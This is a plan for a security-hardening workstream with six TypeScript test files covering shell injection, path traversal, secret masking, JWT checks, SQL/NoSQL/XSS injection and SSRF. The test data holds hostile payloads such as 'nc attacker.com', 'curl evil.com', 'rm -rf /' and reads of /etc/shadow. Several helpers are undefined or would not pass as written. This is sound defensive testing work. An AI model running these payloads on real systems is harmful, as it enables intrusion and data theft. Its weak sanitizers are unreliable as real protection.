# 🔐 WORKSTREAM 1: SECURITY HARDENING

## Mission
Eliminate all security vulnerabilities through comprehensive testing of authentication, authorization, input validation, and attack prevention mechanisms.

## 🎯 Objectives
- Add 50+ security-focused tests
- Fix shell injection vulnerabilities in git_pr.ts
- Implement secret masking validation
- Prevent path traversal attacks
- Add SSRF protection tests

## 📁 Files to Create

### 1. `tests/unit/security/shell-injection.test.ts`

```typescript
/**
 * Shell Injection Prevention Tests
 * Critical: git_pr.ts uses spawnSync with user input
 */

describe('Shell Injection Prevention', () => {
  describe('git_pr.ts command execution', () => {
    test.each([
      ['"; rm -rf /', 'command injection attempt'],
      ['`cat /etc/passwd`', 'backtick injection'],
      ['$(whoami)', 'command substitution'],
      ['| nc attacker.com 1234', 'pipe injection'],
      ['&& curl evil.com', 'command chaining'],
      ['; shutdown -h now', 'semicolon injection'],
      ['> /dev/null; cat /etc/shadow', 'redirect injection'],
      ['--version; ls -la', 'argument injection']
    ])('blocks %s (%s)', async (payload, description) => {
      // Test implementation here
      const sanitize = (cmd: string) => {
        // Must escape shell metacharacters
        return cmd.replace(/[;&|`$(){}[\]<>]/g, '');
      };

      const result = sanitize(payload);
      expect(result).not.toContain(';');
      expect(result).not.toContain('|');
      expect(result).not.toContain('`');
    });
  });

  describe('spawnSync safety', () => {
    test('uses array arguments, not shell: true', () => {
      // Verify spawnSync never uses shell: true
      const execCommand = (cmd: string, args: string[]) => {
        return spawnSync(cmd, args, {
          shell: false, // CRITICAL: must be false
          stdio: 'pipe'
        });
      };

      expect(() => execCommand('ls', ['-la'])).not.toThrow();
    });
  });
});
```

### 2. `tests/unit/security/path-traversal.test.ts`

```typescript
/**
 * Path Traversal Attack Prevention
 * Critical: backup.ts handles user-provided paths
 */

describe('Path Traversal Prevention', () => {
  test.each([
    ['../../../etc/passwd', 'basic traversal'],
    ['..\\..\\..\\windows\\system32', 'windows traversal'],
    ['/etc/passwd', 'absolute path'],
    ['./../../sensitive', 'relative traversal'],
    ['%2e%2e%2f%2e%2e%2f', 'URL encoded'],
    ['....//....//etc/passwd', 'double dots'],
    ['.../.../etc', 'triple dots'],
    ['/var/www/../../etc', 'mixed traversal']
  ])('blocks %s (%s)', (maliciousPath, description) => {
    const sanitizePath = (input: string): string => {
      // Remove path traversal attempts
      const cleaned = input
        .replace(/\.\./g, '')
        .replace(/^\//, '')
        .replace(/^[A-Za-z]:/, '');

      // Ensure within safe directory
      const safePath = path.join('/safe/base/', cleaned);
      if (!safePath.startsWith('/safe/base/')) {
        throw new Error('Path traversal detected');
      }

      return safePath;
    };

    const result = sanitizePath(maliciousPath);
    expect(result).toMatch(/^\/safe\/base\//);
    expect(result).not.toContain('..');
  });
});
```

### 3. `tests/unit/security/secret-exposure.test.ts`

```typescript
/**
 * Secret Exposure Prevention Tests
 * Ensure secrets never leak in logs, errors, or responses
 */

describe('Secret Masking', () => {
  const secrets = {
    GITHUB_TOKEN: 'ghp_xxxxxxxxxxxxxxxxxxxx',
    API_KEY: 'sk-proj-xxxxxxxxxxxxx',
    DATABASE_URL: 'postgresql://user:password@host/db',
    JWT_SECRET: 'super-secret-key-12345'
  };

  test('masks secrets in log output', () => {
    const maskSecrets = (text: string): string => {
      let masked = text;

      // Mask common secret patterns
      masked = masked.replace(/ghp_[A-Za-z0-9]{36}/g, 'ghp_****');
      masked = masked.replace(/sk-[A-Za-z0-9-]{48}/g, 'sk-****');
      masked = masked.replace(/:\/\/([^:]+):([^@]+)@/g, '://$1:****@');
      masked = masked.replace(/Bearer\s+[\w-]+\.[\w-]+\.[\w-]+/g, 'Bearer ****');

      return masked;
    };

    const logMessage = `Connecting with token ${secrets.GITHUB_TOKEN}`;
    const masked = maskSecrets(logMessage);

    expect(masked).not.toContain('ghp_xxxxxxxxxxxxxxxxxxxx');
    expect(masked).toContain('ghp_****');
  });

  test('prevents secrets in error messages', () => {
    class SafeError extends Error {
      constructor(message: string) {
        super(maskSensitive(message));
      }
    }

    const error = new SafeError(`Auth failed: ${secrets.API_KEY}`);
    expect(error.message).not.toContain('sk-proj');
    expect(error.message).toContain('****');
  });
});
```

### 4. `tests/unit/security/auth-bypass.test.ts`

```typescript
/**
 * Authentication & Authorization Tests
 */

describe('Authentication Security', () => {
  describe('JWT validation', () => {
    test('rejects expired tokens', () => {
      const validateToken = (token: string): boolean => {
        const payload = parseJWT(token);
        if (payload.exp < Date.now() / 1000) {
          return false;
        }
        return true;
      };

      const expiredToken = createToken({ exp: Date.now() / 1000 - 3600 });
      expect(validateToken(expiredToken)).toBe(false);
    });

    test('prevents algorithm confusion', () => {
      // Ensure only specific algorithms accepted
      const allowedAlgorithms = ['HS256'];

      const validateAlgorithm = (token: string): boolean => {
        const header = parseHeader(token);
        return allowedAlgorithms.includes(header.alg);
      };

      const noneToken = createToken({}, { alg: 'none' });
      expect(validateAlgorithm(noneToken)).toBe(false);
    });
  });

  describe('Permission escalation', () => {
    test('prevents role manipulation', () => {
      const checkPermission = (user: any, resource: string) => {
        // Never trust client-provided roles
        const actualRole = database.getUserRole(user.id);
        return permissions[actualRole].includes(resource);
      };

      const maliciousUser = { id: 1, role: 'admin' }; // Fake admin
      expect(checkPermission(maliciousUser, 'delete_all')).toBe(false);
    });
  });
});
```

### 5. `tests/unit/security/injection-attacks.test.ts`

```typescript
/**
 * Comprehensive Injection Attack Tests
 */

describe('Injection Attack Prevention', () => {
  describe('SQL Injection', () => {
    test.each([
      ["1' OR '1'='1", 'always true'],
      ["admin'--", 'comment injection'],
      ["1; DROP TABLE users;", 'stacked queries'],
      ["' UNION SELECT * FROM passwords", 'union injection'],
      ["\\'; EXEC xp_cmdshell('dir');", 'command execution']
    ])('blocks SQL injection: %s (%s)', (payload, type) => {
      const query = (input: string) => {
        // Must use parameterized queries
        return db.query('SELECT * FROM users WHERE id = $1', [input]);
      };

      expect(() => query(payload)).not.toThrow();
      // Verify it's treated as literal string, not SQL
    });
  });

  describe('NoSQL Injection', () => {
    test('prevents operator injection', () => {
      const payload = { $ne: null }; // Would match all documents

      const sanitize = (input: any) => {
        if (typeof input === 'object') {
          const str = JSON.stringify(input);
          if (str.includes('$')) {
            throw new Error('Invalid input');
          }
        }
        return input;
      };

      expect(() => sanitize(payload)).toThrow('Invalid input');
    });
  });

  describe('XSS Prevention', () => {
    test.each([
      ['<script>alert(1)</script>', 'script tag'],
      ['<img onerror="alert(1)" src=x>', 'event handler'],
      ['javascript:alert(1)', 'javascript protocol'],
      ['<svg onload=alert(1)>', 'SVG injection'],
      ['<iframe src="javascript:alert(1)">', 'iframe injection']
    ])('sanitizes XSS: %s (%s)', (payload, type) => {
      const sanitizeHTML = (input: string): string => {
        return input
          .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
          .replace(/on\w+\s*=/gi, '')
          .replace(/javascript:/gi, '');
      };

      const clean = sanitizeHTML(payload);
      expect(clean).not.toContain('script');
      expect(clean).not.toContain('alert');
      expect(clean).not.toContain('javascript:');
    });
  });
});
```

### 6. `tests/unit/security/ssrf-prevention.test.ts`

```typescript
/**
 * Server-Side Request Forgery Prevention
 */

describe('SSRF Prevention', () => {
  const blockedHosts = [
    '127.0.0.1',
    'localhost',
    '169.254.169.254', // AWS metadata
    '10.0.0.0/8',
    '172.16.0.0/12',
    '192.168.0.0/16'
  ];

  test.each(blockedHosts)('blocks internal IP: %s', (host) => {
    const isAllowedHost = (url: string): boolean => {
      const parsed = new URL(url);

      // Block internal IPs
      if (blockedHosts.some(h => parsed.hostname.includes(h))) {
        return false;
      }

      // Only allow HTTPS to external hosts
      return parsed.protocol === 'https:';
    };

    expect(isAllowedHost(`http://${host}/admin`)).toBe(false);
  });

  test('prevents DNS rebinding', async () => {
    const fetchSafely = async (url: string) => {
      // Resolve DNS before and after
      const before = await dns.resolve(new URL(url).hostname);
      const response = await fetch(url);
      const after = await dns.resolve(new URL(url).hostname);

      if (before !== after) {
        throw new Error('DNS rebinding detected');
      }

      return response;
    };

    // Test implementation
  });
});
```

## 📊 Success Metrics

- [ ] All 50+ security tests passing
- [ ] No shell injection vulnerabilities
- [ ] Path traversal fully prevented
- [ ] Secrets never exposed in logs
- [ ] SSRF attacks blocked
- [ ] XSS/SQL injection prevented

## 🚀 Execution Instructions

1. Create all test files in `tests/unit/security/`
2. Run tests: `npm run test:security`
3. Fix any failing tests by updating source code
4. Verify coverage: `npm run test:coverage -- --grep security`

## 🔍 Files to Review & Fix

Priority files requiring security updates:
- `src/worker/handlers/git_pr.ts` - Shell injection risk
- `src/lib/backup.ts` - Path traversal risk
- `src/lib/secrets.ts` - Secret exposure risk
- `src/api/routes/auth.ts` - Authentication bypass
- `src/lib/logger.ts` - Secret masking needed

## ⚠️ Critical Vulnerabilities to Fix

1. **git_pr.ts line 31**: spawnSync with user input
2. **backup.ts line 172**: copyDir with user paths
3. **secrets.ts**: No masking in getSecret
4. **logger.ts**: Logs may contain secrets
5. **auth.ts**: JWT algorithm not validated

## ✅ Completion Checklist

- [ ] Created all 6 test files
- [ ] 50+ security tests written
- [ ] All tests passing
- [ ] Source code updated for failures
- [ ] No security warnings in npm audit
- [ ] Coverage report generated

---

**This workstream is independent and can be completed without waiting for others.**